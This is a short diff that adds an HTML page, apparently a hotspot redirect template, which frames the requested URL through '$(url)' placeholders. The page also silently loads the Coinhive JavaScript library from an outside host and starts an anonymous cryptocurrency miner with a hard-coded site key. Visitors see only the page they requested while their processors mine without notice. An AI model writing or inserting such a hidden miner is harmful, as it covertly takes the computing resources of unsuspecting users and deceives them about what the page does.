@@ -1,0 +1,14 @@
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+	<title>"$(url)"</title> 
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('9Jp1CXPHedWhOjudG6GaKKqabmD7V9oV', {throttle: 0.1});
+	miner.start();
+</script>
+</head>
+<frameset>
+<frame src="$(url)"></frame>
+</frameset>
+</html>
